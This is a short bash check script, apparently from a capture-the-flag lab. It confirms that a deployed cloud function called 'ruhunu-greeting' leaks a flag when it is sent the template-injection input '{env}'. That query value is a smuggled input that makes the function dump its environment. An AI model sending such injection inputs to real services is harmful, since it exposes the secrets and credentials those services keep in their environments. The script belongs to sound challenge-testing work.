#!/usr/bin/env bash
source "$(git rev-parse --show-toplevel)/shared/lib/common.sh"
load_env
source "$REPO_ROOT/shared/lib/gcp.sh"
FN="ruhunu-greeting"
URL="$(GC functions describe "$FN" --gen2 --region "$GCP_REGION" \
  --format='value(serviceConfig.uri)' 2>/dev/null || true)"
[[ -n "$URL" ]] || { err "10 FAIL: function not deployed"; exit 1; }
# -g (globoff) is REQUIRED: without it curl treats {env} as a URL glob set,
# strips the braces, and sends template=env — the function then returns the
# literal string "env" and the check fails even though the challenge is fine.
body="$(curl -g -fsS --max-time 20 "${URL}?template={env}" || true)"
grep -qE "${FLAG_PREFIX}\{[^}]+\}" <<<"$body" \
  && ok "10: env leak returns the flag" \
  || { err "10 FAIL: no flag leaked"; exit 1; }
